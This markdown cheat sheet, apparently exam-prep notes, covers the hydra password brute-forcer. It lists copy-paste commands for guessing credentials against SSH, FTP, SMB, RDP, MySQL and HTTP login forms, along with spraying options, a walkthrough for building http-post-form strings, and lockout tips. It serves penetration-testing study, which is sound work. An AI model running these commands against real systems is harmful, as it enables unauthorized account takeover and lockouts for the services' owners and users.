# hydra — online password brute force

> **The go-to online brute forcer.** If the exam gives you a live service (SSH, FTP, HTTP login, SMB, RDP, MySQL...) and a username or wordlist, the answer almost always comes from hydra. For offline hash cracking use [john](./john.md) or [hashcat](./hashcat.md) instead.

**Install check (Parrot — already installed):** `hydra -h | head`

---

## 🎯 Cheat-flow: "What do I brute force?"

| You need to... | Run this | Notes |
|---|---|---|
| Brute force **SSH** one user | `hydra -l <USER> -P /usr/share/wordlists/rockyou.txt ssh://<IP>` | Port 22 |
| Brute force **FTP** | `hydra -l <USER> -P rockyou.txt ftp://<IP>` | Port 21 |
| Brute force **SMB** | `hydra -l <USER> -P rockyou.txt smb://<IP>` | Port 445 |
| Brute force **RDP** | `hydra -l <USER> -P rockyou.txt rdp://<IP>` | Port 3389, slow |
| Brute force **MySQL** | `hydra -l root -P rockyou.txt mysql://<IP>` | Port 3306 |
| Brute force **HTTP BASIC auth** | `hydra -l <USER> -P rockyou.txt <IP> http-get /admin` | Basic-auth dialog |
| Brute force **HTTP POST form** | `hydra -l <USER> -P rockyou.txt <IP> http-post-form "/login.php:user=^USER^&pass=^PASS^:F=Invalid"` | See [form section](#http-post-form-the-tricky-one) |
| Username **and** password list | `hydra -L users.txt -P pass.txt ssh://<IP>` | Spray style |
| Try user = password | `hydra -L users.txt -e nsr ssh://<IP>` | `n`=null, `s`=user==pass, `r`=reversed |
| Stop on first hit | `hydra ... -f` | Faster when you only need one |
| Resume an aborted session | `hydra -R` | Uses `./hydra.restore` |

---

## 🔑 Flags you must know cold

### Credentials
| Flag | Meaning |
|---|---|
| `-l <user>` | **Single** login name |
| `-L <file>` | File of logins (one per line) |
| `-p <pass>` | **Single** password |
| `-P <file>` | File of passwords |
| `-C <file>` | Combo file, `user:pass` per line (use instead of `-l`/`-L`/`-p`/`-P`) |
| `-e nsr` | Try extras: **n**ull, **s**ame as user, **r**eversed user |
| `-u` | Loop users first (default loops passwords first) |

### Target
| Flag | Meaning |
|---|---|
| `<IP> <service>` | Positional form: `hydra -l u -p p 10.10.10.10 ssh` |
| `<service>://<IP>` | URI form (preferred) |
| `-s <port>` | Override default port |
| `-M <file>` | File of targets (one per line) |
| `-S` | Use SSL |

### Tuning
| Flag | Meaning |
|---|---|
| `-t <n>` | Parallel tasks per target (default 16; **use 4 for RDP/SSH**) |
| `-T <n>` | Total parallel connections across all targets |
| `-w <n>` | Wait time per response (sec) |
| `-W <n>` | Wait time between connects |
| `-f` | Exit after first valid pair per host |
| `-F` | Exit after first valid pair across all targets |
| `-V` | Verbose (show every attempt) |
| `-vV` | Very verbose |
| `-o <file>` | Write found creds to file |
| `-I` | Ignore existing restore file |

---

## 🧪 Services hydra supports (exam-relevant)

`ssh` · `ftp` · `ftps` · `smb` · `smb2` · `rdp` · `mysql` · `mssql` · `postgres` · `vnc` · `telnet` · `rsh` · `rlogin` · `snmp` · `ldap2` · `ldap3` · `smtp` · `smtps` · `pop3` · `pop3s` · `imap` · `imaps` · `http-get` · `http-post` · `http-head` · `http-get-form` · `http-post-form` · `https-get` · `https-post-form` · `icq`

Full list: `hydra -U <service>` (usage for that module) or just `hydra` with no args.

---

## 📋 Command recipes (copy-paste)

```bash
# 1. SSH single user against rockyou
hydra -l <USER> -P /usr/share/wordlists/rockyou.txt -t 4 -f -V ssh://<IP>

# 2. FTP with user list + password list
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -f -o ftp.found ftp://<IP>

# 3. SMB (Windows box) — hydra throttles itself to 1 thread automatically
hydra -L users.txt -P pass.txt smb://<IP>

# 4. RDP — go slow (4 threads max) or you'll lock accounts
hydra -l administrator -P pass.txt -t 4 rdp://<IP>

# 5. MySQL root
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://<IP>

# 6. HTTP Basic auth on /admin
hydra -l admin -P rockyou.txt <IP> http-get /admin

# 7. HTTP POST form (DVWA-style login)
hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> http-post-form \
  "/login.php:username=^USER^&password=^PASS^:F=Login failed"

# 8. HTTPS POST form with cookie
hydra -l admin -P rockyou.txt <IP> https-post-form \
  "/login:user=^USER^&pass=^PASS^:H=Cookie: PHPSESSID=abcd1234:F=incorrect"

# 9. User == password / blank / reversed
hydra -L users.txt -e nsr ssh://<IP>

# 10. Combo file mode
hydra -C combos.txt ssh://<IP>
```

---

## 🧩 http-post-form (the tricky one)

Format:
```
"<path>:<post-body>:<failure-string>"
```

- `^USER^` and `^PASS^` are replaced by each attempt.
- Failure condition can be:
  - `F=<text>` — fail if response contains this text
  - `S=<text>` — success if response contains this text (use this when the failure page is dynamic)
  - `H=Cookie: name=value` — add header (useful for session cookies)

Step-by-step to build it:
1. In Burp / browser dev tools, submit a wrong login and grab the request.
2. Copy the **path** (e.g. `/login.php`).
3. Copy the **body** and replace the username field value with `^USER^`, password with `^PASS^`.
4. Note a unique string from the **failure** response ("Invalid credentials", "Login failed", etc.).
5. Assemble: `"/login.php:username=^USER^&password=^PASS^:F=Invalid credentials"`.

---

## ⚠️ Gotchas

- **rockyou.txt path on Parrot:** `/usr/share/wordlists/rockyou.txt`. If missing / `.gz`, run `sudo gunzip /usr/share/wordlists/rockyou.txt.gz`.
- **Hydra looping wrong direction** — by default it loops passwords per user. Add `-u` to loop users per password (better for spraying).
- **SMB/RDP will lockout accounts** — keep `-t 4` or lower and prefer a short targeted list over rockyou.
- **HTTP form fails silently** — wrong failure string. Try `S=` mode instead of `F=`, or confirm with a single known-bad: `hydra -l x -p y ... http-post-form "..."` and watch `-V`.
- **Special characters in body** (`:`, `&`) must be URL-encoded or they break the three-field format.
- **Hydra says "0 valid passwords found"** on a service you know has creds → try the URI form vs positional form, and double-check port with `-s`.
- **Offline hashes** → don't use hydra. Use [john](./john.md) or [hashcat](./hashcat.md).
- **Web form with CSRF token** → hydra can't handle rotating tokens. Use `ffuf`, `wfuzz`, or a Python script.
- **`.restore` file** left behind after Ctrl+C — resume with `hydra -R`, or delete it with `-I`.

---

## 🔗 Related

- [john](./john.md) — offline hash cracking
- [hashcat](./hashcat.md) — GPU offline cracking
- [crackmapexec](./crackmapexec.md) — SMB/WinRM spraying with extras
- [hashid](./hashid.md) — identify a hash before cracking
